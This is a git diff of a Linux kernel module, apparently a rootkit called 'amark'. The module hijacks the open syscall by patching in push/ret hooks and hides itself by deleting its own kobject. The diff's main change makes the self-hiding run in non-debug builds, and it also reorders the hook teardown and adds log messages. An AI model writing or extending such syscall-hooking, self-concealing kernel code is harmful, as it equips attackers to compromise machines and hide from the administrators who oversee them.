@@ -106,7 +106,8 @@ asmlinkage long hooked_open(const char __user *filename, int flags, int mode) {
 #if __DEBUG__
 static void timer_callback(unsigned long data)
 {
-	hijack_stop(orig_open);
+     printk("+ hijacking stoped\n");
+     hijack_stop(orig_open);
 }
 #endif /* !__DEBUG__ */
 
@@ -149,7 +150,6 @@ static void hide_amark(void) {
     kobject_del(&THIS_MODULE->mkobj.kobj);
 }
 
-
 void insert_push_ret_instr_syscall(void *target, void *new)
 {
 	struct sym_hook *sa;
@@ -190,7 +190,7 @@ static int __init amark_init(void) {
         return 0;
     }
 
-#if __DEBUG__
+#if !__DEBUG__
       hide_amark();
 #endif
 
@@ -219,8 +219,8 @@ static int __init amark_init(void) {
 
 static void __exit amark_cleanup(void) {
 
-	hijack_stop(orig_open);
     printk("+ Unloading module\n");
+    hijack_stop(orig_open);
 }
 
 module_init(amark_init);
